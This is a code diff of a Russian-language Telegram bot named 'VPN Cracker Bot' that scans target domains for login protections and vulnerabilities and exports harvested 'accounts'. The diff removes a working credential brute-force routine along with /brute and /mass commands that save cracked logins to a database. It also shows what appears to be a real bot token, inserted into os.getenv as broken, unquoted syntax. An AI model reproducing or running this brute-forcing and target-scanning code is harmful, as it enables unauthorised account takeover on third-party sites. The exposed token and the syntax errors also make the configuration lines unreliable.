@@ -6,11 +6,9 @@ import sqlite3
 import random
 import re
 import socket
-import ssl
 from datetime import datetime
 
 import aiohttp
-import aiofiles
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -20,9 +18,9 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from fake_useragent import UserAgent
 
 # ============ КОНФИГУРАЦИЯ ============
-BOT_TOKEN = os.getenv("8720885527:AAFAPOYXlaIjN-iaeIDQe8VN3fkiFpvZ3b8")
+BOT_TOKEN = os.getenv(8720885527:AAFAPOYXlaIjN-iaeIDQe8VN3fkiFpvZ3b8)
 ADMIN_IDS = []
-admin_id_str = os.getenv("@lassstik05")
+admin_id_str = os.getenv(@lassstik05)
 if admin_id_str:
     try:
         ADMIN_IDS = [int(admin_id_str)]
@@ -114,22 +112,6 @@ async def scan_domain(domain: str) -> dict:
     }
     
     try:
-        # WHOIS
-        try:
-            import whois
-            w = whois.whois(domain)
-            result['registrar'] = w.registrar
-        except Exception as e:
-            result['errors'].append(f"whois: {e}")
-        
-        # DNS A-запись
-        try:
-            import dns.resolver
-            answers = dns.resolver.resolve(domain, 'A')
-            result['ip'] = str(answers[0])
-        except Exception as e:
-            result['errors'].append(f"dns: {e}")
-        
         # HTTP-анализ
         try:
             async with aiohttp.ClientSession() as session:
@@ -187,50 +169,6 @@ async def scan_domain(domain: str) -> dict:
     
     return result
 
-async def brute_force(domain: str, wordlist: list = None) -> list:
-    if not wordlist:
-        wordlist = ['admin', 'password', '123456', 'qwerty', 'letmein', 'admin123']
-    
-    found = []
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(
-                f"https://{domain}",
-                headers={'User-Agent': ua.random},
-                timeout=10
-            ) as resp:
-                html = await resp.text()
-                form_action = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html)
-                if not form_action:
-                    return found
-                
-                action = form_action.group(1)
-                if not action.startswith('http'):
-                    action = f"https://{domain}{action if action.startswith('/') else '/' + action}"
-                
-                for username in wordlist[:3]:
-                    for password in wordlist[:3]:
-                        try:
-                            data = {'username': username, 'password': password}
-                            async with session.post(
-                                action,
-                                data=data,
-                                headers={'User-Agent': ua.random},
-                                timeout=5,
-                                allow_redirects=False
-                            ) as resp2:
-                                if resp2.status in [302, 301]:
-                                    found.append({'username': username, 'password': password})
-                                    break
-                        except:
-                            continue
-                    if found:
-                        break
-    except Exception as e:
-        logger.error(f"Bruteforce error: {e}")
-    
-    return found
-
 # ============ КОМАНДЫ БОТА ============
 class ScannerStates(StatesGroup):
     waiting_for_domain_list = State()
@@ -245,8 +183,6 @@ async def start_cmd(message: types.Message):
         "🔥 **VPN Cracker Bot**\n\n"
         "📋 Команды:\n"
         "/scan <domain> - сканировать цель\n"
-        "/brute <domain> - брутфорс логина\n"
-        "/mass - загрузить список доменов\n"
         "/status - статус базы\n"
         "/export - выгрузить аккаунты\n"
         "/clear - очистить базу\n"
@@ -297,50 +233,10 @@ async def scan_cmd(message: types.Message):
 🛡️ 2FA: {'✅' if result.get('has_2fa') else '❌'}
 🤖 Капча: {'✅' if result.get('has_captcha') else '❌'}
 🔓 Уязвимости: {'⚠️ ' + result.get('vuln_type', '') if result.get('vulnerable') else '✅ Нет'}
-🖥️ IP: {result.get('ip', 'Неизвестно')}
 {'⚠️ Ошибки: ' + '; '.join(result.get('errors', [])) if result.get('errors') else ''}
     """
     
     await status_msg.edit_text(report, parse_mode="Markdown")
-
-@dp.message(Command("brute"))
-async def brute_cmd(message: types.Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    
-    parts = message.text.split()
-    if len(parts) < 2:
-        await message.answer("❌ Укажи домен: /brute example.com")
-        return
-    
-    domain = parts[1].strip()
-    status_msg = await message.answer(f"🔓 Брутфорс {domain}...")
-    
-    results = await brute_force(domain)
-    
-    if results:
-        target_id = cursor.execute("SELECT id FROM targets WHERE domain=?", (domain,)).fetchone()
-        if target_id:
-            target_id = target_id[0]
-        else:
-            cursor.execute("INSERT INTO targets (domain, url, checked_at) VALUES (?, ?, ?)",
-                          (domain, f"https://{domain}", datetime.now().isoformat()))
-            target_id = cursor.lastrowid
-        
-        for cred in results:
-            cursor.execute("""
-                INSERT INTO credentials (target_id, username, password, method, found_at)
-                VALUES (?, ?, ?, ?, ?)
-            """, (target_id, cred['username'], cred['password'], 'bruteforce', datetime.now().isoformat()))
-        conn.commit()
-        
-        report = f"✅ Найдено {len(results)} аккаунтов:\n\n"
-        for cred in results:
-            report += f"👤 {cred['username']} : {cred['password']}\n"
-        
-        await status_msg.edit_text(report)
-    else:
-        await status_msg.edit_text(f"❌ Ничего не найдено для {domain}")
 
 @dp.message(Command("status"))
 async def status_cmd(message: types.Message):
@@ -430,77 +326,8 @@ async def health_cmd(message: types.Message):
         parse_mode="Markdown"
     )
 
-@dp.message(Command("mass"))
-async def mass_scan_cmd(message: types.Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    
-    await message.answer("📤 Отправь файл со списком доменов (по одному на строку)")
-    await message.state.set_state(ScannerStates.waiting_for_domain_list)
-
-@dp.message(ScannerStates.waiting_for_domain_list)
-async def process_domain_list(message: types.Message, state: FSMContext):
-    if not message.document:
-        await message.answer("❌ Отправь файл")
-        return
-    
-    if not message.document.file_name.endswith('.txt'):
-        await message.answer("❌ Отправь .txt файл")
-        return
-    
-    file = await bot.get_file(message.document.file_id)
-    file_path = await bot.download_file(file.file_path, "domains.txt")
-    
-    with open("domains.txt", "r") as f:
-        domains = [line.strip() for line in f if line.strip()]
-    
-    await state.clear()
-    status_msg = await message.answer(f"🚀 Массовое сканирование {len(domains)} доменов...")
-    
-    results = []
-    for i, domain in enumerate(domains):
-        result = await scan_domain(domain)
-        results.append(result)
-        if (i + 1) % 5 == 0:
-            await status_msg.edit_text(f"📊 Прогресс: {i+1}/{len(domains)}")
-    
-    for result in results:
-        cursor.execute("""
-            INSERT OR REPLACE INTO targets (domain, url, cms, has_2fa, has_captcha, vulnerable, vuln_type, ip, registrar, checked_at)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        """, (
-            result['domain'],
-            result['url'],
-            result.get('cms', 'unknown'),
-            1 if result.get('has_2fa') else 0,
-            1 if result.get('has_captcha') else 0,
-            1 if result.get('vulnerable') else 0,
-            result.get('vuln_type'),
-            result.get('ip'),
-            result.get('registrar'),
-            datetime.now().isoformat()
-        ))
-        conn.commit()
-    
-    stats = {
-        'total': len(results),
-        'vulnerable': sum(1 for r in results if r.get('vulnerable')),
-        'with_2fa': sum(1 for r in results if r.get('has_2fa')),
-        'wordpress': sum(1 for r in results if r.get('cms') == 'WordPress'),
-    }
-    
-    await status_msg.edit_text(
-        f"📊 **Итоги массового сканирования**\n\n"
-        f"🎯 Всего: {stats['total']}\n"
-        f"🔓 Уязвимых: {stats['vulnerable']}\n"
-        f"🛡️ С 2FA: {stats['with_2fa']}\n"
-        f"📦 WordPress: {stats['wordpress']}",
-        parse_mode="Markdown"
-    )
-
 # ============ ЗАПУСК ============
 async def main():
-    logger.info("VPN Cracker Bot запущен")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
